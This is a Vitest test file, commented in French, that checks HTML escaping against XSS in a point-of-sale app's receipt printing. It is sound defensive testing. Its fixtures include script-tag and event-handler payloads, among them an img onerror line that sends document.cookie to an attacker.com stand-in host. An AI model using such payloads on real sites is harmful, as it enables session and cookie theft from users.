/**
 * SUITE DE TESTS : P1-06 — Protection Anti-XSS dans les Flux d'Impression
 *
 * Règles validées :
 * - P1-06 : Échappement HTML strict des données injectées dans document.write / iframes d'impression.
 * - Neutralisation des balises <script>, attributs onerror/onclick/onmouseover, quotes et chevrons.
 */

import { describe, it, expect } from "vitest";
import { escapeHtml } from "@/lib/utils";
import { generateReceiptHtml } from "@/lib/printer/escpos-printer";
import { type LocalSale } from "@/lib/db/dexie-schema";

describe("P1-06 — Sécurité Anti-XSS & Échappement HTML", () => {
  describe("1. Fonction Utilitaire escapeHtml", () => {
    it("neutralise les balises script malveillantes", () => {
      const payload = "<script>alert('XSS')</script>";
      const safe = escapeHtml(payload);
      expect(safe).toBe("&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;");
      expect(safe).not.toContain("<script>");
    });

    it("neutralise les injections via balises img et gestionnaires d'événements", () => {
      const payload = '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">';
      const safe = escapeHtml(payload);
      expect(safe).toBe("&lt;img src=x onerror=&quot;fetch(&#039;http://attacker.com/steal?c=&#039;+document.cookie)&quot;&gt;");
      expect(safe).not.toContain("<img");
      expect(safe).not.toContain('"');
    });

    it("gère gracieusement les valeurs nulles ou indéfinies", () => {
      expect(escapeHtml(null)).toBe("");
      expect(escapeHtml(undefined)).toBe("");
      expect(escapeHtml(12345)).toBe("12345");
    });
  });

  describe("2. Génération de Reçus Thermiques ESC/POS Sécurisés", () => {
    it("neutralise les attaques XSS injectées via les noms de produits ou le nom du magasin", () => {
      const maliciousSale: LocalSale = {
        id: "sale-xss-1",
        organization_id: "org-1",
        site_id: "site-1",
        device_id: "dev-1",
        sale_number: 'FACT-"<script>alert(1)</script>',
        sale_status: "completed",
        payment_method: "cash",
        subtotal_cents: 5000,
        discount_cents: 0,
        tax_amount_cents: 763,
        total_cents: 5000,
        amount_paid_cents: 5000,
        change_cents: 0,
        created_by: "usr-1",
        sync_status: "synced",
        mecef_status: "pending_fiscal",
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        items: [
          {
            id: "item-1",
            sale_id: "sale-xss-1",
            product_id: "p-1",
            product_name: '<b onmouseover="alert(\'XSS\')">Fer à béton 12mm</b>',
            product_reference: '<script>evil()</script>',
            unit_price_cents: 5000,
            quantity: 1,
            tax_group: "B",
            tax_rate_percent: 18,
            discount_cents: 0,
            line_total_cents: 5000,
            sort_order: 0,
          },
        ],
      };

      const maliciousStoreName = '<span onclick="evil()">OBASA QUINCAILLERIE</span>';

      const html = generateReceiptHtml(maliciousSale, maliciousStoreName);

      // Vérifier qu'aucune balise HTML ou script injecté n'apparaît sous forme exécutable
      expect(html).not.toContain("<script>alert(1)</script>");
      expect(html).not.toContain('<b onmouseover="alert(\'XSS\')">');
      expect(html).not.toContain('<span onclick="evil()">');

      // Vérifier que les versions échappées sont bien présentes
      expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
      expect(html).toContain("&lt;b onmouseover=&quot;alert(&#039;XSS&#039;)&quot;&gt;Fer à béton 12mm&lt;/b&gt;");
      expect(html).toContain("&lt;span onclick=&quot;evil()&quot;&gt;OBASA QUINCAILLERIE&lt;/span&gt;");
    });
  });
});
